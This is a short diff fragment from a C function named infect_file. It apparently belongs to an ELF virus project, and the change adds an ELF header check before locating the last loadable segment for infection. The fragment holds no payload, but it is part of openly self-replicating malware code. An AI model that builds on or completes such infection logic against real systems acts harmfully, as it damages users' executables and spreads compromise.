@@ -27,6 +27,9 @@ uint8_t	*infect_file(void *file, size_t file_size, void *start_virus)
 {
 	printf("%s\n", __func__);
 	(void)start_virus;
+	if (check_elf_header(file, file_size) == FAILURE)
+		return NULL;
+	printf("ELF Hdr is OK\n");
 	// Check if file is good, and find last loadable segment
 	Elf64_Phdr *phdr = find_phdr(file, file_size);
 	if (phdr == NULL)
